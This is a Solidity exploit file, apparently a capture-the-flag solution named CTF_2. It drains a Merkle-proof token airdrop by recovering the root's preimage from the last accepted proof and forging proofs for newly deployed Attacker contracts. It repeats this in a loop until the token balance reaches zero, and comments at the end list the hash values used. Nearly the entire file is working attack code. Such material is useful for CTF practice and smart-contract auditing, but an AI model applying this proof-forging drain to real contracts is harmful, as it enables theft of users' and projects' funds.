// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface Airdrop {
    function withdraw(bytes32[] memory merkleProof) external;
    function token() external returns (IERC20);
    function latestAcceptedProof() external view returns (bytes32[] memory);
}

contract Attacker {
    Airdrop airdrop;
    constructor(address _airdrop) {
        airdrop = Airdrop(_airdrop);
    }

    function go(bytes32 preImageRoot) public {
        bytes32[] memory merkleProof = new bytes32[](4);
        merkleProof[0] = bytes32(uint256(uint160(address(this))));
        merkleProof[1] = 0x0000000000000000000000000000000000000000000000000000000000000000;
        merkleProof[2] = merkleProof[1];
        bytes32 tree_12 = Merkle.pairHash(Merkle.pairHash(merkleProof[0], merkleProof[1]), merkleProof[2]);
        // merkleProof[3] = keccak256(abi.encodePacked(keccak256(abi.encodePacked(merkleProof[0])))) ^ preImageRoot;
        merkleProof[3] = tree_12 ^ preImageRoot;
        airdrop.withdraw(merkleProof);
    }
}

library Merkle {
    function proofHash(bytes32[] memory nodes) internal pure returns (bytes32 result) {
        result = pairHash(nodes[0], nodes[1]);
        for (uint256 i = 2; i < nodes.length; i++) {
            result = pairHash(result, nodes[i]);
        }
    }

    function pairHash(bytes32 a, bytes32 b) internal pure returns (bytes32) {
        return keccak256(abi.encode(a ^ b));
    }
}

contract CTF_2 {
    Airdrop public airdrop;

    constructor(address _airdrop) {
        airdrop = Airdrop(_airdrop);
        attack();
    }

    function _getRootPreImage() internal view returns(bytes32 root, bytes32 preImageRoot) {
        bytes32[] memory latestAcceptedProof = airdrop.latestAcceptedProof();
        bytes32 tree_8 = Merkle.pairHash(latestAcceptedProof[0], latestAcceptedProof[1]);
        bytes32 tree_12 = Merkle.pairHash(tree_8, latestAcceptedProof[2]);
        preImageRoot = tree_12 ^ latestAcceptedProof[3];
        root = keccak256(abi.encode(preImageRoot));
    }

    function attack() public {
        while(airdrop.token().balanceOf(address(airdrop)) > 0) {
            Attacker attacker = new Attacker(address(airdrop));
            (,bytes32 preImageRoot) = _getRootPreImage();
            attacker.go(preImageRoot);
        }
    }
}


// 0x000000000000000000000000c54e1e97eebbccdc956a689bdda3e7da52318ebd
// 0x0000000000000000000000000153b902e495ef2bd12f3b7bacbf416b14b2b421
// 0x97746c5e93191fb84fd130f6f46719bc22b54bb5c6ee812f063118658ea2f0cf
// 0x6955dad6356cca1ceff27c74dd559f8d1dead50652800ced2edfc58b4271a76b
// 0x345db72dc6f880bc839259bf734820aff07a9dc63be5ba00111b6f85f059a15d root
// 0xc596f6ab87cbd38c9715c43d043070f6bf185991cdbb4c2b35380af326ab9da2 - preimage of root
// 0x000000000000000000000000c54e1e97eebbccdc956a689bdda3e7da52318ebd,0x0000000000000000000000000153b902e495ef2bd12f3b7bacbf416b14b2b421,0xa66cc928b5edb82af9bd49922954155ab7b0942694bea4ce44661d9a8736c688,0xacc32c7db2a7199078e7b849d965ef7ba2f28c979f3b40c61be7cf7864da3ac9